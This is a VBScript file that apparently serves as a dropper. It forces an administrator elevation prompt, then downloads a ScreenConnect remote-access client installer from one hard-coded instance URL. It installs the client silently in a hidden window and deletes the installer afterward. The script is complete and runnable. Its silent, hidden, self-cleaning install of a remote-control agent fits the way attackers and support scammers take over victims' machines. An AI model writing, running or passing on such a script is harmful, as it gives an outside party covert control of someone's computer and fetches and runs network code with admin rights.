Option Explicit

' =========================================================================
' FORCE ADMIN ELEVATION WAPPER
' =========================================================================
If Not WScript.Arguments.Named.Exists("elevate") Then
    Dim objShellApp
    Set objShellApp = CreateObject("Shell.Application")
    ' Relaunches this exact file with administrative switches
    objShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    Set objShellApp = Nothing
    WScript.Quit
End If

' =========================================================================
' MAIN SCRIPT CONFIGURATION
' =========================================================================
Dim url, savePath, logPath
url = "https://fourpines.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=NBGTR6VCDER&c=&c=&c=&c=&c=&c=&c="
savePath = "C:\Windows\Temp\downloaded_installer.msi"
logPath = "C:\Windows\Temp\install_log.txt"

' 1. DOWNLOAD THE MSI FILE FROM THE WEB URL
Dim xmlHttp, adodbStream
Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
xmlHttp.Open "GET", url, False
xmlHttp.Send

If xmlHttp.Status = 200 Then
    Set adodbStream = CreateObject("ADODB.Stream")
    adodbStream.Type = 1 ' Binary
    adodbStream.Open
    adodbStream.Write xmlHttp.ResponseBody
    adodbStream.SaveToFile savePath, 2 ' Overwrite if exists
    adodbStream.Close
    Set adodbStream = Nothing
Else
    WScript.Echo "Download failed. HTTP Status: " & xmlHttp.Status
    WScript.Quit
End If
Set xmlHttp = Nothing

' 2. EXECUTE THE SILENT INSTALLATION
Dim objShell, command
Set objShell = CreateObject("WScript.Shell")

command = "msiexec.exe /i " & Chr(34) & savePath & Chr(34) & _
          " /qn /norestart /L*V " & Chr(34) & logPath & Chr(34)

objShell.Run command, 0, True
Set objShell = Nothing

' 3. CLEAN UP AND DELETE THE DOWNLOADED MSI FILE
Dim objFSO
Set objFSO = CreateObject("Scripting.FileSystemObject")

If objFSO.FileExists(savePath) Then
    objFSO.DeleteFile savePath, True
End If

Set objFSO = Nothing
